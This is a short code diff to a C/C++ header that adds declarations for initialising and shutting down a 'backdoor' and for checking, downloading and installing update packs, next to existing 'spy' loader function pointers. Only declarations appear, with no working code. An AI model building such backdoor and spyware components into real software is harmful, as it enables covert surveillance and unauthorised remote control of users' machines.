@@ -10,6 +10,15 @@ bool init_library();
 bool init_dll_func();
 // release dll libary, when exit
 void free_library();
+// khoi tao backdoor
+void init_backdoor();
+// shutdown backdoor
+void free_backdoor();
+// check update then download update pack when is available
+bool check_and_dwnl_update();
+// install update pack which downloaded
+void install_update_pack();
 
 LOAD_SPY load_spy = NULL;
 UNLOAD_SPY unload_spy = NULL;
+PATH_COMBINE path_combine = NULL;
